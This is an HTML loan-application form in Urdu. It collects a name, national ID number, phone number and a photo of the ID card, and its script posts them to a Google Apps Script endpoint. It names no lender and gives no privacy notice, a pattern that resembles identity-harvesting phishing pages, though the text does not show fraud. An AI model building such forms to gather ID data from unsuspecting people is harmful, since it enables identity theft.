<div class="form-container">
  <h2>Loan Application</h2>
  <form id="loanForm" enctype="multipart/form-data">
    <label>نام:</label>
    <input type="text" name="name" placeholder="اپنا نام درج کریں" required>

    <label>شناختی کارڈ نمبر:</label>
    <input type="text" name="cnic" placeholder="xxxxx-xxxxxxx-x" required>

    <label>فون نمبر:</label>
    <input type="tel" name="phone" placeholder="03xx-xxxxxxx" required>

    <label>شناختی کارڈ کی تصویر:</label>
    <input type="file" name="photo" accept="image/*" capture="environment" required>

    <button type="submit">جمع کریں</button>
    <div id="status"></div>
  </form>
</div>

<script>
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbz3r3vzsHHgZ3T1bj5oSoGdMoL9JyCbtzYgUgujHIahomhKMKLlKW8YvduTJGoeP1e4tg/exec";

document.getElementById("loanForm").addEventListener("submit", async function(e) {
  e.preventDefault();
  const statusEl = document.getElementById("status");
  statusEl.textContent = "براہ کرم انتظار کریں...";

  const formData = new FormData(this);

  try {
    const res = await fetch(WEB_APP_URL, { method: "POST", body: formData });
    const text = await res.text();
    if (res.ok) {
      statusEl.textContent = text || "ڈیٹا کامیابی سے جمع ہو گیا!";
      this.reset();
    } else {
      statusEl.textContent = "غلطی: " + (text || res.statusText);
    }
  } catch (err) {
    statusEl.textContent = "ڈیٹا جمع کرنے میں مسئلہ آیا، براہ کرم دوبارہ کوشش کریں۔";
    console.error(err);
  }
});
</script>

